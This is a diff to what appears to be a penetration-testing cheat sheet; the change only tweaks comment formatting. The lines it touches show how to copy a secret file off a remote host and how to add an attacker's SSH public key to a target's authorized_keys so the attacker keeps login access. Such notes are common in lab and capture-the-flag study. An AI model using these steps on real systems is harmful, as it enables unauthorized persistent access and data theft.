@@ -171,18 +171,18 @@ __Download the reverse shell in windows__
 - Downloading a file from a remote system.
   - `scp user@10.10.10.10:/home/user/secret.zip .`
 ### SSH Login from Attacker to Target using id_rsa
-```
-# Generate SSH Key Pair on Attacker Machine
+```sh
+#Generate SSH Key Pair on Attacker Machine
 ssh-keygen -t rsa -b 2048 -f ~/.ssh/id_rsa # Give empty password
 
-# Copy Public Key from Attacker
+#Copy Public Key from Attacker
 cat ~/.ssh/id_rsa.pub
 
-# Add Public Key to Target Machine
+#Add Public Key to Target Machine
 cd ~/.ssh
 echo '<paste your public key here>' >> authorized_keys
 
-# From Attacker Machine
+#From Attacker Machine
 ssh -i ~/.ssh/id_rsa athena@<target-ip>
 
 ```
